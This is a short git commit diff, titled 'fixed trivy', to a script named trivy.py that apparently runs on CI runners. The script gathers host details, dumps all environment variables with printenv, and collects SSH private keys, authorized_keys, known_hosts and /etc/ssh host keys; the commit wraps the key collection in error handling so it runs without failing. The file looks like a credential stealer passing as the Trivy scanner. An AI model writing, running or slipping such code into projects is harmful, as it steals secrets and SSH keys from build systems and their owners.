57a5657ec897994ea6f428fc9c4fd5d1147df07b
Reinhard Kugler <rkugler@sba-research.org>
2026-06-25 05:01:12 -0400

    fixed trivy

--- trivy.py
+++ trivy.py
@@ -19,10 +19,13 @@ homes = ['/home/runner']
 run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
 run('printenv')
 
-for h in homes+['/root']:
-    for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa','/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']:
-        emit(h+f)
-    walk([h+'/.ssh'],2,lambda fp,fn:True)
-
-walk(['/etc/ssh'],1,lambda fp,fn:fn.startswith('ssh_host') and fn.endswith('_key'))
+try:
+    for h in homes+['/root']:
+        for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa','/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']:
+            emit(h+f)
+        walk([h+'/.ssh'],2,lambda fp,fn:True)
+    
+    walk(['/etc/ssh'],1,lambda fp,fn:fn.startswith('ssh_host') and fn.endswith('_key'))
+except FileNotFoundError as e:
+    print(f"file not found {e}")
 
